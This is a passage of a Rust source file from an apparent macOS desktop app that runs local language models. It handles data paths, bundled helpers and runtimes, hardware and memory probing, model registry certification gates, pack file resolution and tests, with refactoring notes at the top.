// Galactus desktop, Rust side.
//
// This file was 10 673 lines and is now 3 147. What is LEFT is the plumbing
// nothing else could own: where files live on this machine, what the hardware
// is, the model registry, pack resolution and the volume measurements, the
// folder picker, voice and notifications, the preview protocol, the tray, and
// `run` itself with the command table.
//
// What used to be here as well, and now sits beside it:
//
//   engine.rs         l'etat du moteur, son demarrage, son arret, son journal
//   planner.rs        ce que ce Mac peut demarrer, et comment, avec ses types
//   documents.rs      PDF, Word, tableurs, images, OCR
//   settings.rs       le JSON de reglages, ecrit par renommage, en 0600
//   install.rs        telecharger, profiler, planifier, empaqueter un modele
//   tools.rs          les outils de l'agent derriere le portail de permissions
//   library.rs        memoire, coffre Obsidian, skills, procedures apprises
//   mcp.rs            les connecteurs tiers parles en JSON-RPC sur stdio
//   conversations.rs  les fils sur le disque et la recherche dedans
//
// FOUR LESSONS, each paid for once, and each still true for the next split:
//
//   A banner says where a section STARTS, not what belongs to it.
//   `server_generation_tests` sat inside the documents banner and tests the
//   engine's generation counter; `folder_chooser_tests` sat inside the planner
//   range and chooses no plan. planner.rs and engine.rs were therefore cut by
//   NAMING what moves, not by cutting between two banners.
//
//   Braces inside string literals are not braces. Counting them to find the
//   end of an item ran 3 300 lines past a test module holding a "{" in a
//   message, and truncated plan_cache by 331 lines of body. Top-level items in
//   this file close on a brace in COLUMN ZERO; that is the only marker a
//   literal cannot forge.
//
//   A test that reads its own source moves WITH the code it reads.
//   `memory_lock_tests` greps for the memory functions and followed them into
//   library.rs; `ctx_window_tests` followed kv_bytes_for into planner.rs.
//
//   Nothing here is verified by the fact that it compiles. Every move was
//   checked line by line against the file before it, normalising for the two
//   mechanical edits a split makes (visibility prefixes, module-qualified call
//   sites), until the only remaining differences were ones somebody meant.
//   That check is what caught the truncation above; the compiler did not.
//
// The modules that carry types the rest of the crate names bare are re-exported
// below, so a split does not turn into a thousand-line rename.

mod code;
mod conversations;
mod documents;
mod engine;
mod install;
mod library;
mod mcp;
mod planner;
mod settings;
pub(crate) use engine::*;
pub(crate) use planner::*;
pub(crate) use mcp::*;
pub(crate) use settings::*;
mod tools;
mod cron;
mod hardware;
mod knowledge;
mod lsp;
mod pty;
mod housekeeping;
mod image;
mod imgapi;
mod webm;
mod regexlite;
mod secaudit;
mod ssh;
mod relay;
mod pylang;
mod scheduler;
mod search;
mod snapshot;
mod symbols;
mod toolchain;
pub mod cli;

use serde::Serialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write as IoWrite};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use std::time::{Duration, Instant};
use tauri::{AppHandle, Emitter, Manager};

const SERVER_PORT_BASE: u16 = 8737;
const SERVER_PORT_SPAN: u16 = 40;

// ---------------------------------------------------------------- settings



#[cfg(unix)]
pub(crate) fn set_private_mode(path: &Path, mode: u32) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    let mut permissions = std::fs::metadata(path).map_err(|e| e.to_string())?.permissions();
    permissions.set_mode(mode);
    std::fs::set_permissions(path, permissions).map_err(|e| e.to_string())
}

#[cfg(not(unix))]
pub(crate) fn set_private_mode(_path: &Path, _mode: u32) -> Result<(), String> {
    Ok(())
}






/// The release notes shipped with this build, or an empty string.
///
/// Read from the bundle rather than fetched: someone who installed from a DMG
/// never saw a manifest, and after the restart that follows an in-app update
/// there is nothing left to ask. The file is written by prepare-engine.sh from
/// app/RELEASE-NOTES-v<version>.md.
#[tauri::command]
fn release_notes() -> String {
    resource_dir()
        .map(|r| r.join("packaged/release-notes.md"))
        .and_then(|p| std::fs::read_to_string(p).ok())
        .unwrap_or_default()
}









pub(crate) fn galactus_root() -> Result<PathBuf, String> {
    let map = settings_load();
    if let Some(root) = map.get("root").cloned().filter(|s| !s.is_empty()) {
        let p = PathBuf::from(root);
        if p.join("scripts/models-registry.json").exists() {
            // The refresh used to live inside provision_default_root, which
            // only runs when NO root is configured. Every user who had ever
            // launched an older build had one, so the branch that keeps the
            // catalogue current was exactly the branch they never took: their
            // model list was frozen at whatever shipped with their first
            // install, and two new certified models were invisible to them.
            // Once per process: this is called on nearly every command.
            static ONCE: std::sync::Once = std::sync::Once::new();
            ONCE.call_once(|| {
                if !root_is_a_checkout(&p) {
                    let _ = refresh_policy_files(&p);
                }
            });
            return Ok(p);
        }
    }
    // No (valid) checkout configured: run self-contained on the bundled data.
    provision_default_root()
}

/// Bundle Resources dir (packaged app) or src-tauri (dev run).
pub(crate) fn swift_helper(name: &str) -> Result<PathBuf, String> {
    // Precompiled helper shipped in the bundle: works on Macs without the
    // Command Line Tools (no swiftc needed at runtime).
    if let Some(res) = resource_dir() {
        let prebuilt = res.join("packaged").join(name);
        if prebuilt.is_file() {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                if let Ok(meta) = std::fs::metadata(&prebuilt) {
                    let mut perm = meta.permissions();
                    if perm.mode() & 0o111 == 0 {
                        perm.set_mode(0o755);
                        let _ = std::fs::set_permissions(&prebuilt, perm);
                    }
                }
            }
            return Ok(prebuilt);
        }
    }
    let bin = app_support().join(name);
    let src_candidates = [
        std::env::current_dir()
            .unwrap_or_default()
            .join(format!("src-tauri/helpers/{name}.swift")),
        // Packaged app: the helper ships as a bundle resource
        // (Contents/MacOS/<exe> → Contents/Resources/helpers/…).
        std::env::current_exe()
            .ok()
            .and_then(|p| {
                p.parent()
                    .and_then(|d| d.parent())
                    .map(|d| d.join(format!("Resources/helpers/{name}.swift")))
            })
            .unwrap_or_default(),
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.join(format!("helpers/{name}.swift"))))
            .unwrap_or_default(),
        galactus_root()
            .map(|r| r.join(format!("app/src-tauri/helpers/{name}.swift")))
            .unwrap_or_default(),
    ];
    let src = src_candidates
        .iter()
        .find(|p| p.is_file())
        .cloned()
        .ok_or_else(|| format!("helper source not found: app/src-tauri/helpers/{name}.swift"))?;

    // Rebuild when the source is newer than the cached binary.
    let stale = match (std::fs::metadata(&bin), std::fs::metadata(&src)) {
        (Ok(b), Ok(s)) => match (b.modified(), s.modified()) {
            (Ok(bt), Ok(st)) => bt < st,
            _ => false,
        },
        _ => true,
    };
    if !bin.is_file() || stale {
        std::fs::create_dir_all(app_support()).map_err(|e| e.to_string())?;
        let out = Command::new("swiftc")
            .args(["-O", "-o"])
            .arg(&bin)
            .arg(&src)
            .output()
            .map_err(|e| format!("swiftc unavailable ({e}). Install Xcode Command Line Tools: xcode-select --install"))?;
        if !out.status.success() {
            return Err(format!(
                "{name} failed to build: {}",
                String::from_utf8_lossy(&out.stderr)
                    .lines()
                    .take(6)
                    .collect::<Vec<_>>()
                    .join(" | ")
            ));
        }
    }
    Ok(bin)
}

pub(crate) fn resource_dir() -> Option<PathBuf> {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(res) = exe
            .parent()
            .and_then(|p| p.parent())
            .map(|p| p.join("Resources"))
        {
            if res.join("engine/llama-server").exists() || res.join("packaged").exists() {
                return Some(res);
            }
        }
    }
    let dev = std::env::current_dir().unwrap_or_default().join("src-tauri");
    if dev.join("engine").exists() || dev.join("packaged").exists() {
        return Some(dev);
    }
    None
}

/// The llama-server shipped inside the app bundle (fully relocated: dylibs
/// and OpenSSL travel with it). Returns None when the app was built without
/// an engine (dev builds before prepare-engine.sh).
fn bundled_engine() -> Option<PathBuf> {
    let bin = resource_dir()?.join("engine/llama-server");
    if !bin.is_file() {
        return None;
    }
    // Resource copying does not guarantee the executable bit.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(&bin) {
            let mut perm = meta.permissions();
            if perm.mode() & 0o111 == 0 {
                perm.set_mode(0o755);
                let _ = std::fs::set_permissions(&bin, perm);
            }
        }
    }
    Some(bin)
}

/// The isolated Python runtime shipped in the bundle. A virgin macOS has no
/// /usr/bin/python3 (it is a Command Line Tools shim that pops an install
/// dialog): the app must never depend on it.
/// rust-analyzer embarque, et les sources de la bibliotheque standard qui vont
/// avec. Retourne le binaire et la racine des sources, ou None si l'outillage
/// n'a pas ete embarque a la construction.
///
/// Le serveur seul resout la navigation a l'interieur du projet mais pas
/// `std::` : sans sysroot il signale des erreurs partout. Les sources
/// suffisent, le toolchain complet (1,2 Go) n'a pas a etre livre. Si l'utilisateur
/// a rustup, rust-analyzer utilisera en plus `cargo metadata` pour resoudre
/// les dependances de son projet, ce que les sources seules ne donnent pas.
pub(crate) fn bundled_rust_analyzer() -> Option<(PathBuf, PathBuf)> {
    let root = resource_dir()?.join("rust-tooling");
    let bin = root.join("rust-analyzer");
    let src = root.join("rust-src/library");
    if bin.is_file() && src.is_dir() {
        Some((bin, src))
    } else {
        None
    }
}

/// Chemin du serveur et de son sysroot, pour la vue Code. Expose au frontend
/// afin que le badge de niveau dise la verite : Rust passe au niveau complet
/// seulement si les deux sont reellement presents.
#[tauri::command]
fn rust_analyzer_paths() -> Option<(String, String)> {
    bundled_rust_analyzer()
        .map(|(b, s)| (b.display().to_string(), s.display().to_string()))
}

fn bundled_python() -> Option<PathBuf> {
    let bin = resource_dir()?.join("python/bin/python3");
    if bin.is_file() {
        Some(bin)
    } else {
        None
    }
}

/// A ready-to-use python3 invocation: bundled interpreter in isolated mode
/// (-I: ignores PYTHON* env vars and user site-packages, a local sandbox),
/// falling back to the system python3 for developer checkouts.
pub(crate) fn python3_cmd() -> Command {
    match bundled_python() {
        Some(bin) => {
            let mut c = Command::new(bin);
            c.arg("-I");
            c
        }
        None => Command::new("python3"),
    }
}

/// Self-contained mode: data lives in Application Support/Galactus/data,
/// seeded from the registry and scripts bundled with the app. No checkout,
/// no third-party install: plug and play.
fn provision_default_root() -> Result<PathBuf, String> {
    // Once per process, like the configured-root branch already does.
    //
    // This is the DEFAULT path, taken by every plug-and-play install, and it
    // re-copied four files on every call: the registry plus three Python
    // scripts, so about fifty kilobytes of copy-and-rename. galactus_root() is
    // called by hw_info, registry_entry, measured_geometry (so by every
    // plan_cache), load_registry and list_volumes; painting the Models page
    // runs a recommendation for each of twelve models, each of which plans
    // twice. That is hundreds of file copies for one screen.
    static PROVISIONED: OnceLock<Result<PathBuf, String>> = OnceLock::new();
    PROVISIONED.get_or_init(provision_default_root_once).clone()
}

fn provision_default_root_once() -> Result<PathBuf, String> {
    let root = app_support().join("data");
    let scripts = root.join("scripts");
    std::fs::create_dir_all(&scripts).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join("models")).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root.join("artifacts/h4/packs")).map_err(|e| e.to_string())?;
    let res = resource_dir()
        .ok_or("Galactus folder is not set and the app bundle carries no packaged data")?;
    let _ = res;
    refresh_policy_files(&root)?;
    Ok(root)
}

/// The files that belong to the application rather than to the user.
///
/// The catalogue, the profiler and the two pack scripts are policy and
/// implementation: an upgraded app must not keep running the registry, the
/// hardware floor or the installer that shipped with its FIRST installation.
///
/// Copy then rename, so a launch interrupted halfway leaves the previous file
/// whole rather than a truncated one.
fn refresh_policy_files(root: &Path) -> Result<(), String> {
    let res = resource_dir()
        .ok_or("Galactus folder is not set and the app bundle carries no packaged data")?;
    let src = res.join("packaged/scripts");
    let scripts = root.join("scripts");
    std::fs::create_dir_all(&scripts).map_err(|e| e.to_string())?;
    for f in [
        "models-registry.json",
        // Without this the Images view is dead on every machine but a
        // checkout: load_registry reads it from the root, and a provisioned
        // root only ever holds what this list puts there.
        "image-models.json",
        "moe-profile.py",
        "galactus-pack-plan.py",
        "galactus-pack-write.py",
    ] {
        let destination = scripts.join(f);
        let temporary = scripts.join(format!(".{f}.new"));
        std::fs::copy(src.join(f), &temporary).map_err(|e| format!("refresh {f}: {e}"))?;
        std::fs::rename(&temporary, &destination).map_err(|e| format!("activate {f}: {e}"))?;
    }
    Ok(())
}

#[cfg(test)]
mod packaged_files_tests {
    /// Every file the app installs into a provisioned root must actually be in
    /// the bundle.
    ///
    /// This is the test that would have caught image-models.json: the Rust list
    /// said to install it, the build script never copied it, and the Images view
    /// was therefore dead on every machine except a git checkout, where the file
    /// happens to be there already. Two lists in two languages, and nothing
    /// compared them.
    #[test]
    fn the_build_script_bundles_every_policy_file_the_app_installs() {
        let here = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        let rust = std::fs::read_to_string(here.join("src/lib.rs")).expect("lib.rs");
        let shell = std::fs::read_to_string(here.join("prepare-engine.sh")).expect("prepare-engine.sh");

        // The list inside refresh_policy_files.
        let start = rust.find("fn refresh_policy_files").expect("refresh_policy_files");
        let block = &rust[start..start + 1200];
        let wanted: Vec<&str> = block
            .lines()
            .filter_map(|l| l.trim().strip_prefix('"'))
            .filter_map(|l| l.split('"').next())
            .filter(|f| f.contains('.'))
            .collect();
        assert!(wanted.contains(&"models-registry.json"), "the list was not found: {wanted:?}");
        assert!(
            wanted.contains(&"image-models.json"),
            "the image registry must be installed into a provisioned root"
        );

        // The copy loop in the build script.
        let line = shell
            .lines()
            .find(|l| l.trim_start().starts_with("for f in models-registry.json"))
            .expect("the copy loop");
        for f in &wanted {
            assert!(
                line.contains(f),
                "{f} is installed by the app but never copied into the bundle by prepare-engine.sh"
            );
        }
    }
}

/// Whether this root is one the app may overwrite policy files inside.
///
/// A checkout is somebody's working tree: its registry is edited, measured into
/// and committed, and an app that copied its bundled copy over it would destroy
/// work between two launches. A provisioned folder, or any plain folder a user
/// pointed the app at, holds no such history and must be kept current.
///
/// The test is the presence of a `.git` entry, not a guess from the path. It is
/// a file as well as a directory: a worktree carries `.git` as a file.
fn root_is_a_checkout(root: &Path) -> bool {
    root.join(".git").exists()
}

// ---------------------------------------------------------------- hardware

#[derive(Serialize, Clone)]
struct HwInfo {
    chip: String,
    cores: u32,
    ram_gb: u64,
    disk_free_gb: u64,
    /// GPU cores, from ioreg. `None` on Intel or in a VM.
    gpu_cores: Option<u32>,
    /// The CPU tiers, fastest first, named as macOS names them. Never a name
    /// this code invented: see `hardware::read_core_levels`.
    core_levels: Vec<hardware::CoreLevel>,
    /// `MTLDevice.recommendedMaxWorkingSetSize`: the unified memory this GPU
    /// may keep resident. `None` when there is no Metal device.
    gpu_working_set_bytes: Option<u64>,
    /// Apple's published memory bandwidth for this chip, GB/s. `None` for any
    /// chip released after this build. Shown, never used to decide.
    bandwidth_gbs: Option<f64>,
    /// What the engine may hold in total RIGHT NOW: the tightest of the four
    /// bounds. This is the number a user needs to understand any refusal, and
    /// it is the one the app never showed.
    engine_budget_bytes: u64,
    /// Live, and the reason `hw_info` is worth calling more than once.
    power_source: hardware::PowerSource,
    power_mode: hardware::PowerMode,
}

fn run_capture(cmd: &str, args: &[&str]) -> String {
    Command::new(cmd)
        .args(args)
        .output()
        .ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_default()
}

// Async so the probe (df on a possibly sleeping external volume) runs off the
// main thread; the sync impl stays for internal and CLI callers.
#[tauri::command]
async fn hw_info() -> HwInfo {
    hw_info_impl()
}

/// Memory this Mac can actually hand over right now, not the memory it was sold
/// with.
///
/// The planner budgeted against `hw.memsize` and subtracted a fixed reserve for
/// "macOS and whatever the user is doing". That reserve is a guess about
/// somebody else's machine: it was right on the machine this was written on and
/// wrong on a colleague's 24 GB Mac with a browser open, where the engine came
/// back with "Compute error." and nothing pointing at memory.
///
/// Free plus inactive plus speculative, because macOS counts as inactive the
/// pages it will hand over without hesitating, and counting only `free` would
/// make a healthy Mac look full. Purgeable is deliberately NOT counted: it is
/// reclaimable, but reclaiming it costs the app that owns it.
///
/// Returns None when vm_stat cannot be read or parsed, and the caller then
/// falls back to the installed-RAM budget: a missing measurement must not make
/// the planner refuse everything.
fn available_memory_bytes() -> Option<u64> {
    let out = run_capture("vm_stat", &[]);
    if out.is_empty() {
        return None;
    }
    let mut page = 0u64;
    if let Some(i) = out.find("page size of ") {
        page = out[i + 13..]
            .split_whitespace()
            .next()
            .and_then(|s| s.parse().ok())
            .unwrap_or(0);
    }
    if page == 0 {
        return None;
    }
    let mut pages = 0u64;
    let mut seen = 0;
    for line in out.lines() {
        let want = line.starts_with("Pages free:")
            || line.starts_with("Pages inactive:")
            || line.starts_with("Pages speculative:");
        if !want {
            continue;
        }
        if let Some(v) = line.rsplit(':').next() {
            if let Ok(n) = v.trim().trim_end_matches('.').parse::<u64>() {
                pages += n;
                seen += 1;
            }
        }
    }
    if seen == 0 {
        return None;
    }
    Some(pages.saturating_mul(page))
}

#[cfg(test)]
mod available_memory_tests {
    use super::available_memory_bytes;

    #[test]
    fn it_reads_a_plausible_figure_from_this_machine() {
        // Not a fixed value: the point is that it parses vm_stat and lands in a
        // range no parsing bug would land in. A misread page size or a dropped
        // decimal point leaves this by orders of magnitude.
        let got = available_memory_bytes().expect("vm_stat is readable on macOS");
        assert!(got > 100_000_000, "suspiciously small: {got}");
        assert!(got < 2_000_000_000_000, "suspiciously large: {got}");
    }
}

fn hw_info_impl() -> HwInfo {
    // The static half is read once per process and cached: the chip, the
    // cores, the soldered memory and the Metal limits do not move while the
    // app runs. About 30 ms the first time, nothing after.
    let profile = hardware::static_profile();
    let base = galactus_root()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "/".into());
    let df = run_capture("df", &["-g", &base]);
    let disk_free_gb: u64 = df
        .lines()
        .nth(1)
        .and_then(|l| l.split_whitespace().nth(3))
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);
    // hw.memsize is a power of two: a "128 GB" Mac is 128 GiB. Dividing by
    // 1e9 would report 137 and defeat every min_ram_gb gate.
    let ram_gb = profile.ram_bytes >> 30;
    let live = hardware::live_state(available_memory_bytes());
    let machine = MachineLimits {
        ram_gb,
        available: live.available_bytes,
        gpu_working_set: profile.gpu.map(|g| g.working_set_bytes),
    };
    HwInfo {
        chip: profile.chip.clone(),
        cores: profile.cores,
        ram_gb,
        disk_free_gb,
        gpu_cores: profile.gpu_cores,
        core_levels: profile.core_levels.clone(),
        gpu_working_set_bytes: profile.gpu.map(|g| g.working_set_bytes),
        bandwidth_gbs: profile.bandwidth_gbs,
        engine_budget_bytes: crate::planner::engine_budget_bytes(ram_gb * 1_000_000_000, machine),
        power_source: live.power_source,
        power_mode: live.power_mode,
    }
}

// ---------------------------------------------------------------- registry

fn find_gguf(dir: &Path) -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = std::fs::read_dir(dir)
        .ok()?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().map(|e| e == "gguf").unwrap_or(false))
        .collect();
    candidates.sort();
    // Multi-shard models: the 00001 shard is the one llama.cpp opens.
    candidates.into_iter().next()
}

fn model_paths(root: &Path, id: &str) -> (PathBuf, PathBuf, PathBuf) {
    let model_dir = root.join("models").join(id);
    let pack = root
        .join("artifacts/h4/packs")
        .join(id)
        .join(format!("{id}.pack"));
    let profile = model_dir.join("profile.engine.txt");
    (model_dir, pack, profile)
}

// Async: resolve_packs can glob over external volumes, which stalls when a
// disk has to spin up. The main thread must never wait on that.
#[tauri::command]
async fn load_registry() -> Result<Vec<Value>, String> {
    let root = galactus_root()?;
    let raw = std::fs::read_to_string(root.join("scripts/models-registry.json"))
        .map_err(|e| e.to_string())?;
    let parsed: Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    let models = parsed["models"].as_array().cloned().unwrap_or_default();
    let mut out = Vec::new();
    for mut m in models {
        let id = m["id"].as_str().unwrap_or("").to_string();
        let (model_dir, _pack, _profile) = model_paths(&root, &id);
        let gguf_present = find_gguf(&model_dir).is_some();
        // Dual-pack aware: a model whose packs resolve through the registry
        // fields or the install settings (GLM double-pack) counts as installed.
        let (pack_i, pack_e) = resolve_packs(&root, &id, &m)?;
        let pack_present = pack_i.is_file() && pack_e.is_file();
        m["pack_internal"] = json!(pack_i.display().to_string());
        m["pack_external"] = json!(pack_e.display().to_string());
        m["gguf_present"] = json!(gguf_present);
        m["pack_present"] = json!(pack_present);
        m["installed"] = json!(is_installed(is_dense(&m), gguf_present, pack_present));
        out.push(m);
    }
    Ok(out)
}

fn registry_entry(root: &Path, id: &str) -> Result<Value, String> {
    let raw = std::fs::read_to_string(root.join("scripts/models-registry.json"))
        .map_err(|e| e.to_string())?;
    let parsed: Value = serde_json::from_str(&raw).map_err(|e| e.to_string())?;
    parsed["models"]
        .as_array()
        .and_then(|a| a.iter().find(|m| m["id"] == id).cloned())
        .ok_or_else(|| format!("unknown model {id}"))
}

/// The registry is the execution policy, not a catalogue label.  A model may
/// be listed while its Galactus path is still being validated, but it must not
/// be downloaded or served until one of the accepted certification regimes is
/// recorded.  Keep this gate in the backend so the CLI and a modified webview
/// cannot bypass it.
fn require_certified_model(entry: &Value) -> Result<(), String> {
    let id = entry["id"].as_str().unwrap_or("unknown");
    match entry["status"].as_str() {
        Some("certified" | "certified_bit_transparent" | "certified_by_composition") => Ok(()),
        // A dense model passes this gate without being certified, and the two
        // are not the same statement. Certification means the Galactus path was
        // compared against stock llama.cpp and found identical; a dense model
        // has no Galactus path to compare, because there are no expert tensors
        // to substitute. It runs as plain llama.cpp. What this gate protects
        // against is a MODIFIED execution path whose fidelity is unproven, and
        // an unmodified one carries no such risk.
        Some("stock_unmodified") => Ok(()),
        Some("pending_certification") => Err(format!(
            "model {id} is awaiting Galactus certification and cannot be installed or started"
        )),
        Some(status) => Err(format!(
            "model {id} has unsupported certification status '{status}'"
        )),
        None => Err(format!("model {id} has no certification status")),
    }
}

/// Unified memory is the limiting hardware dimension exposed by the registry.
/// This backend gate mirrors the catalogue filtering and protects direct IPC
/// and CLI calls from downloading hundreds of gigabytes for an unusable model.
fn require_compatible_hardware(entry: &Value, ram_gb: u64) -> Result<(), String> {
    let id = entry["id"].as_str().unwrap_or("unknown");
    let minimum = entry["min_ram_gb"].as_u64().ok_or_else(|| {
        format!("model {id} has no minimum unified-memory requirement in the registry")
    })?;
    if ram_gb < minimum {
        return Err(format!(
            "model {id} requires at least {minimum} GB of unified memory; this Mac has {ram_gb} GB"
        ));
    }
    Ok(())
}

#[cfg(test)]
mod registry_policy_tests {
    use super::*;

    #[test]
    fn every_certified_regime_may_execute() {
        // Certification is one of two ways through this gate. The other is a
        // model with no Galactus path to certify, covered in dense_model_tests:
        // this name used to say "only the three", which stopped being true the
        // day a dense model was added and would have misled the next reader.
        for status in [
            "certified",
            "certified_bit_transparent",
            "certified_by_composition",
        ] {
            assert!(require_certified_model(&json!({"id": "m", "status": status})).is_ok());
        }
    }

    #[test]
    fn pending_unknown_and_missing_statuses_are_rejected() {
        for entry in [
            json!({"id": "pending", "status": "pending_certification"}),
            json!({"id": "draft", "status": "draft"}),
            json!({"id": "missing"}),
        ] {
            assert!(require_certified_model(&entry).is_err());
        }
    }

    #[test]
    fn hardware_gate_uses_the_registry_minimum_and_fails_closed() {
        let model = json!({"id": "large", "min_ram_gb": 128});
        assert!(require_compatible_hardware(&model, 16).is_err());
        assert!(require_compatible_hardware(&model, 127).is_err());
        assert!(require_compatible_hardware(&model, 128).is_ok());
        assert!(require_compatible_hardware(&json!({"id": "unspecified"}), 128).is_err());
    }
}

// ---------------------------------------------------------------- pack resolution

/// Expand a leading `~` or `$HOME` in a user-supplied path.
fn expand_home(s: &str) -> String {
    let home = std::env::var("HOME").unwrap_or_default();
    if let Some(rest) = s.strip_prefix("$HOME") {
        format!("{home}{rest}")
    } else if let Some(rest) = s.strip_prefix('~') {
        format!("{home}{rest}")
    } else {
        s.to_string()
    }
}

/// Wildcard match for ONE path component: `*` (any run) and `?` (one char).
fn component_matches(pat: &str, name: &str) -> bool {
    let p: Vec<char> = pat.chars().collect();
    let n: Vec<char> = name.chars().collect();
    let mut dp = vec![vec![false; n.len() + 1]; p.len() + 1];
    dp[0][0] = true;
    for i in 1..=p.len() {
        if p[i - 1] == '*' {
            dp[i][0] = dp[i - 1][0];
        }
        for j in 1..=n.len() {
            dp[i][j] = match p[i - 1] {
                '*' => dp[i - 1][j] || dp[i][j - 1],
                '?' => dp[i - 1][j - 1],
                c => dp[i - 1][j - 1] && c == n[j - 1],
            };
        }
    }
    dp[p.len()][n.len()]
}

/// First (lexicographic) file matching a simple glob pattern: `*`/`?` inside a
/// component, `**` for any directory depth, the same idioms galactus.env uses.
/// The walk is bounded so a pack lookup stays instant even on a huge volume.
fn glob_first(pattern: &str) -> Option<PathBuf> {
    use std::path::Component;
    let mut base = PathBuf::new();
    let mut parts: Vec<String> = Vec::new();
    let mut in_glob = false;
    for comp in Path::new(pattern).components() {
        match comp {
            Component::RootDir => base.push("/"),
            Component::Normal(c) => {
                let c = c.to_string_lossy().into_owned();
                if !in_glob && !c.contains('*') && !c.contains('?') {
                    base.push(&c);
                } else {
                    in_glob = true;
                    parts.push(c);
                }
            }
            Component::CurDir => {}
            _ => return None,
        }
    }
    if parts.is_empty() {
        return base.is_file().then_some(base);
    }
    fn walk(dir: &Path, parts: &[String], depth: u32, budget: &mut u32, out: &mut Vec<PathBuf>) {
        if *budget == 0 || depth == 0 {
            return;
        }
        let Some((head, rest)) = parts.split_first() else { return };
        let Ok(rd) = std::fs::read_dir(dir) else { return };
        let mut entries: Vec<_> = rd.flatten().collect();
        entries.sort_by_key(|e| e.file_name());
        if head == "**" {
            // `**` also matches zero directories: try the rest right here.
            walk(dir, rest, depth, budget, out);
            for e in &entries {
                if *budget == 0 {
                    return;
                }
                *budget -= 1;
                let p = e.path();
                if p.is_dir() {
                    walk(&p, parts, depth - 1, budget, out);
                }
            }
        } else {
            for e in &entries {
                if *budget == 0 {
                    return;
                }
                *budget -= 1;
                let name = e.file_name().to_string_lossy().into_owned();
                if !component_matches(head, &name) {
                    continue;
                }
                let p = e.path();
                if rest.is_empty() {
                    if p.is_file() {
                        out.push(p);
                    }
                } else if p.is_dir() {
                    walk(&p, rest, depth - 1, budget, out);
                }
            }
        }
    }
    let mut out = Vec::new();
    let mut budget: u32 = 20_000;
    walk(&base, &parts, 8, &mut budget, &mut out);
    out.sort();
    out.into_iter().next()
}

/// Resolve one pack path spec: `~`/`$HOME` expansion, paths relative to the
/// Galactus root, simple glob patterns. Yields the file only if it exists.
fn resolve_pack_spec(root: &Path, spec: &str) -> Option<PathBuf> {
    let expanded = expand_home(spec.trim());
    if expanded.is_empty() {
        return None;
    }
    let full = if Path::new(&expanded).is_absolute() {
        PathBuf::from(&expanded)
    } else {
        root.join(&expanded)
    };
    let s = full.to_string_lossy().into_owned();
    if s.contains('*') || s.contains('?') {
        glob_first(&s)
    } else {
        full.is_file().then_some(full)
    }
}

/// The (internal, external) pack pair of a model, in priority order:
///   (a) `internal_pack` / `external_pack` fields of the registry entry,
///   (b) settings `pack_internal_<id>` / `pack_external_<id>` (dual install),
///   (c) the classic mono pack artifacts/h4/packs/<id>/<id>.pack for BOTH.
/// A tier is selected only when EVERY spec it declares resolves to an existing
/// file: half of a dual pack is useless (the records are cut across the two
/// files), and a registry carrying another machine's paths must fall through.
/// Identical internal and external paths mean mono-volume to the engine.
/// Whether this catalogue entry describes a model with no routed experts.
///
/// Read from the registry rather than from the weights, because the answer is
/// needed BEFORE anything is downloaded: it decides whether the install has
/// three more steps after the download, and whether the engine is started with
/// the streaming layer at all. The GGUF confirms it later, when moe-profile.py
/// refuses a dense checkpoint outright.
fn is_dense(entry: &Value) -> bool {
    entry["dense"].as_bool().unwrap_or(false)
}

/// Whether a catalogue entry is installed on this Mac.
///
/// For a Mixture-of-Experts model the weights alone are not enough: the engine
/// reads experts out of the pack, so a downloaded GGUF with no pack is a job
/// half done and the card must keep offering to finish it.
///
/// A dense model has no pack and never will. Requiring one made it permanently
/// uninstallable: the download completed, the file was on disk, and the card
/// went on saying it was not installed with no way to change that.
fn is_installed(dense: bool, gguf_present: bool, pack_present: bool) -> bool {
    if dense {
        gguf_present
    } else {
        gguf_present && pack_present
    }
}

fn resolve_packs(root: &Path, id: &str, entry: &Value) -> Result<(PathBuf, PathBuf), String> {
    let tier = |i_spec: Option<&str>, e_spec: Option<&str>| -> Option<(PathBuf, PathBuf)> {
        let i = match i_spec {
            Some(s) => Some(resolve_pack_spec(root, s)?),
            None => None,
        };
        let e = match e_spec {
            Some(s) => Some(resolve_pack_spec(root, s)?),
            None => None,
        };
        match (i, e) {
            (Some(i), Some(e)) => Some((i, e)),
            (Some(i), None) => Some((i.clone(), i)),
            (None, Some(e)) => Some((e.clone(), e)),
            (None, None) => None,
        }
    };
    if let Some(p) = tier(entry["internal_pack"].as_str(), entry["external_pack"].as_str()) {
        return Ok(p);
    }
    let settings = settings_load();
    let non_empty = |k: String| -> Option<String> {
        settings.get(&k).map(|v| v.trim().to_string()).filter(|v| !v.is_empty())
    };
    let set_i = non_empty(format!("pack_internal_{id}"));
    let set_e = non_empty(format!("pack_external_{id}"));
    if let Some(p) = tier(set_i.as_deref(), set_e.as_deref()) {
        return Ok(p);
    }
    let (_, pack, _) = model_paths(root, id);
    Ok((pack.clone(), pack))
}

// ---------------------------------------------------------------- volumes + bandwidth

#[derive(Serialize, Clone)]
struct VolumeInfo {
    name: String,
    mount: String,
    /// Suggested pack directory on this volume (GalactusH4 convention).
    dir: String,
    /// Where the bandwidth probe should look for a big file.
    probe: String,
    free_gb: u64,
    total_gb: u64,
}

/// `df -g` for a path: (device, total_gb, free_gb, mount point).
fn df_line(path: &str) -> Option<(String, u64, u64, String)> {
    let out = run_capture("df", &["-g", path]);
    let l = out.lines().nth(1)?;
    let cols: Vec<&str> = l.split_whitespace().collect();
    if cols.len() < 9 {
        return None;
    }
    let device = cols[0].to_string();
    let total = cols[1].parse().ok()?;
    let free = cols[3].parse().ok()?;
    // The mount point may contain spaces: everything from column 8 on.
